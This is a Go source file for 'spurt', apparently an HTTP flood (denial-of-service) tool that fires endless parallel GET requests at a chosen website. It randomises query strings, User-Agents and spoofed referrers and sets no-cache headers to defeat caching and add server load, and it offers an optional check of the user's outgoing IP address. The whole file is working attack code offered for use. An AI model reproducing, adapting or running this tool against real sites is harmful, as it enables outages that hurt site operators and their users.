// spurt
package main

import (
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/buptmiao/parallel"
	"github.com/corpix/uarand"
	"github.com/gookit/color"
)

var (
	version = "v1.5.0"

	banner = fmt.Sprintf(`
                          __
   _________  __  _______/ /_
  / ___/ __ \/ / / / ___/ __/
 (__  ) /_/ / /_/ / /  / /_
/____/ .___/\__,_/_/   \__/
    /_/                      ` + version)

	referrers = []string{
		"https://www.google.com/?q=",
		"https://www.facebook.com/",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.youtube.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
	}
	hostname        string
	paramJoiner     string
	reqCount        uint64
	threads         int
	check           bool
	timeout         int
	timeoutDuration time.Duration
	sleep           int
	sleepDuration   time.Duration
	c               = &http.Client{
		Timeout: timeoutDuration,
	}
)

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func isValidURL(inputURL string) bool {
	// Check if the URL is in a valid format
	_, err := url.ParseRequestURI(inputURL)
	if err != nil {
		fmt.Println("Error parsing URL:", err)
		return false
	}

	// Check if the URL has a scheme (http or https)
	u, err := url.Parse(inputURL)
	if err != nil || u.Scheme == "" {
		fmt.Println("Invalid URL scheme:", u.Scheme)
		return false
	}

	// Check if the URL scheme is either http or https
	if !strings.HasPrefix(u.Scheme, "http") {
		fmt.Println("Unsupported URL scheme:", u.Scheme)
		return false
	}

	// Additional check by making a request to the URL
	resp, err := http.Get(inputURL)
	if err != nil {
		fmt.Println("Error making request:", err)
		return false
	}
	defer resp.Body.Close()

	return true
}

func fetchIP() {
	ip, err := http.Get("https://ipinfo.tw/")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer ip.Body.Close()
	body, err := io.ReadAll(ip.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("\n%s\n", body)
}

func get() {
	if strings.ContainsRune(hostname, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	req, err := http.NewRequest("GET", hostname+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", uarand.GetRandom())
	req.Header.Add("Pragma", "no-cache")                                                       // used in case https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma
	req.Header.Add("Cache-Control", "no-store, no-cache")                                      // creates more load on web server
	req.Header.Set("Referer", referrers[rand.Intn(len(referrers))]+buildblock(rand.Intn(5)+5)) // uses random referer from list
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.Do(req)

	atomic.AddUint64(&reqCount, 1) // increment

	if os.IsTimeout(err) {
		color.Red.Println("Timeout")
	} else {
		color.Green.Println("OK")
	}

	if err != nil {
		return
	}

	defer resp.Body.Close()
}

func loop() {
	for {
		go get()
		time.Sleep(sleepDuration) // sleep before sending request again
	}
}

func main() {
	color.Cyan.Println(banner)
	color.Cyan.Println("\n\t\tgithub.com/zer-far\n")

	flag.StringVar(&hostname, "hostname", "", "example: --hostname https://example.com")
	flag.IntVar(&timeout, "timeout", 3000, "Timeout in milliseconds")
	flag.IntVar(&sleep, "sleep", 1, "Sleep time in milliseconds")
	flag.IntVar(&threads, "threads", 1, "Number of threads")
	flag.BoolVar(&check, "check", false, "Enable IP address check")
	flag.Parse()

	if check {
		fetchIP()
	}

	if !isValidURL(hostname) {
		os.Exit(1)
	}
	if timeout == 0 {
		fmt.Println("Timeout must be greater than 0.")
		os.Exit(1)
	}
	if sleep <= 0 {
		fmt.Println("Sleep time must be greater than 0.")
		os.Exit(1)
	}
	if threads == 0 {
		fmt.Println("Number of threads must be greater than 0.")
		os.Exit(1)
	}

	// convert values to milliseconds
	timeoutDuration = time.Duration(timeout) * time.Millisecond
	sleepDuration = time.Duration(sleep) * time.Millisecond

	color.Yellow.Println("Press control+c to stop")
	time.Sleep(2 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		color.Blue.Println("\nAttempted to send", reqCount, "requests in", time.Since(start)) // print when control+c is pressed
		os.Exit(0)
	}()

	p := parallel.NewParallel() // runs function in parallel
	for i := 0; i < threads; i++ {
		p.Register(loop)
	}
	p.Run()
}
